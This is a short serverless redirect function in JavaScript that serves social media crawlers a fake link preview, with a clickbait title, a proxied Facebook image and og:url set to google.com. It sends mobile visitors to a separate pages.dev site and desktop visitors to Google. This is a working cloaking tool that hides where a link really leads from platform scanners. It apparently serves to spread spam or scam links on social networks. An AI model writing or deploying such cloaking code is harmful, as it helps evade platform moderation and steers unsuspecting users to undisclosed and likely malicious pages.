export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="😱YOU➔BACK➔TO➔BACK➔HIT➔MY➔LOL😱">
    <meta property="og:description" content="🤍♥️beautiful♥️🤍">
    <meta property="og:image" content="https://wsrv.nl/?url=https%3A%2F%2Fscontent.flyp3-1.fna.fbcdn.net%2Fv%2Ft39.2147-6%2F143199239_195005565718084_9069679135931926935_n.jpg%3Fstp%3Dc0.5x0.5f_dst-jpg_flffffff_p500x261_q75_tt6%26_nc_cat%3D101%26_nc_map%3Durlgen_bucketless%26ccb%3D1-7%26_nc_sid%3D39b8c1%26_nc_ohc%3Dg_AzJVcl_lUQ7kNvwFBDnBJ%26_nc_oc%3DAdp40mXsUl5vyWV3zDlppaO-ivmg07gOADgNA_vUgbh85ScCR-DEDZCtFZFlPw06zHQ%26_nc_zt%3D14%26_nc_ht%3Dscontent.flyp3-1.fna%26_nc_gid%3D1tokf0TFph6HRhx50UkJBQ%26_nc_ss%3D7b2a8%26oh%3D00_AQOWDO7wzvkU1wA28ODlbVCLfcYi_vI6hNwbGMkiV3LZkQ%26oe%3D6AD5A5D9">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://lota-pro-max1.pages.dev", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
